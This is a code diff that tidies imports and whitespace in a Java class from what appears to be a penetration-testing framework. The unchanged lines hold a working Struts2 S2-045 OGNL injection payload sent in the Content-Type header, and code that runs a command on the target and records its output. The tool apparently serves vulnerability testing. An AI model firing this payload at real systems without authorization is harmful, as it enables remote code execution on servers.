@@ -1,10 +1,6 @@
 package com.orleven.tentacle.permeate.script;
 
-import java.io.IOException;
 import java.util.Map;
-
-import org.apache.http.ParseException;
-import org.springframework.context.annotation.ComponentScan;
 import org.springframework.context.annotation.Scope;
 import org.springframework.stereotype.Component;
 import com.orleven.tentacle.core.IOC;
@@ -33,7 +29,6 @@ public class Struts2RCE045 extends WebScriptBase {
 		String provePayload = "%{(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('ProveFlag','The Struts2-045 Remote Code Execution Is Exist!'))}.multipart/form-data";
 		String proveFlag = "The Struts2-045 Remote Code Execution Is Exist!";
 		String result = null;
-
 		getHttpHeaders().put("Content-Type", provePayload);
 		Map<String, String> resHeaders = WebUtil.getResponseAllHeaders(WebUtil.httpGet(getTargetUrl(), getHttpHeaders()));
 		if (resHeaders==null) {
@@ -64,10 +59,8 @@ public class Struts2RCE045 extends WebScriptBase {
 		if(result!=null){
 			result = result.substring(result.indexOf(flag));
 		}
-		
 		proveBean.setReceiveMessage(result);
 		proveBean.setSendMessage(command);
 		getVulnerBean().getProveBean().add(proveBean);
-
 	}
 }
